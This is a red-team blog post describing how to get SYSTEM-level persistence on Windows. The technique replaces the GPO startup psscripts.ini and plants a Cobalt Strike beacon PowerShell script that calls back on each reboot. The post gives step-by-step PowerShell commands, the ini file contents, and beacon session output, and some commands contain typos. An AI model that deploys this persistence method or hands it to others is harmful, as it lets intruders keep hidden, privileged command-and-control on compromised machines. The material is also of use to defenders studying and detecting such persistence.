---
author: killswitch
comments: false
date: 2016-01-25 04:32:51+00:00
layout: post
link: http://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/
slug: system-context-persistence-in-gpo-startup
title: SYSTEM Context Persistence in GPO Startup Scripts
wordpress_id: 724
categories:
- Red Teaming / Pen Testing
---

Interesting enough I was recently experimenting on GPO settings to configure my Applocker for testing and came by Scripts under the (Computer Configuration) settings for GPO. This defiantly caught my attention, since persistence is a cat and mouse game of stored locations / methods. **This has been mentioned but I haven't seen it talked about so hey why not share what I did**

[![Screen Shot 2016-01-24 at 10.36.07 PM](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-10.36.07-PM-1024x761.png)](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-10.36.07-PM.png)

I knew I wanted to weaponize it from a pure command line standpoint as the configuration utility is pretty much point and click. Some of the assumptions are:




    
  1. You have already elevated or have Local Admin context on the box

    
  2. Have the ability to upload a file in your agent (CobaltStike) / Have a Deployable .BAT/PS script

    
  3. Willing to drop something to disk for persistence



[![Screen Shot 2016-01-24 at 10.41.18 PM](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-10.41.18-PM.png)](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-10.41.18-PM.png)

While that GUI looks quite simple and easy to use, that would be to dang easy! Lets get started:

The current process I use to deploy a CS Fully Staged Beacon:




    
  1. Enumerate current GPO scripts

    
  2. Remove the psscripts.ini

    
  3. Upload a new psscripts.ini

    
  4. Upload the Beacon.ps1 scripts

    
  5. conduct a Gpupdate

    
  6. On restart you should get a beacon!



The location of interest (while this seems trivial, do to the permissions on this directory you will have to force all commands):


    
    C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup



Enumerate the Dir (See if a scripts.ini is built):


    
    beacon> powershell Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
    [*] Tasked beacon to run: Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
    [+] host called home, sent: 77 bytes
    [+] received output:
     Directory: C:\Windows\System32\GroupPolicy\Machine\Scripts
    Mode LastWriteTime Length Name 
    ---- ------------- ------ ---- 
    d---- 10/15/2015 6:36 PM Shutdown 
    d---- 1/24/2016 5:57 PM Startup 
    -a-h- 1/24/2016 5:28 PM 184 psscripts.ini



Enumerate to see the current scripts in-play:


    
    powershell type C:\Windows\System32\GroupPolicy\Machine\Scripts\psscripts.ini



As you will noticed the structure goes (the 0Cmd.. is incremental):


    
    [ScriptsConfig]
    StartExecutePSFirst=true
    [Startup]
    0CmdLine=beacon2.ps1
    0Parameters=



Simply copy this data and save it locally in a text editor and add in you PS agent name. Once you have completed this go ahead and upload to the target. A side note on this, something extremely weird happens when trying to use the built in shell / ls / cd within CS beacons. While this was a pain, I just resorted to using PS for most of it.

Go ahead and delete the original psscripts.ini:


    
    powershell Remove-Item -Force C:\Windo0ws\System32\GroupPolicy\Machine\Scripts\psscripts.ini



After uploading the script to the C:\ drive (In my case I no ability to upload directly to the location):


    
    powershell Move-Item -force -path C:\psscripts.ini -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\



Finally using CS Beacons Stageless PowerShel script I moved that to the required location:


    
    powershell Move-Item -force -path C:\beacon2.ps1 -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup




    
    gpupdatep /force



Finally on reboot you should have a callback! :)

[![Screen Shot 2016-01-24 at 11.25.47 PM](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-11.25.47-PM-1024x151.png)](http://cybersyndicates.com/wp-content/uploads/2016/01/Screen-Shot-2016-01-24-at-11.25.47-PM.png)

To wrap up this seems like a great SYSTEM level call back and the cool part is you can add in parameters for custom payloads. Ex. if you wanted to only start at certain time you could pass the time or date that would like to restrict or even extend. This method seems extremely strong and has proved to be reliable method. Soon to come is the CS aggressor script and PS script to automate this.
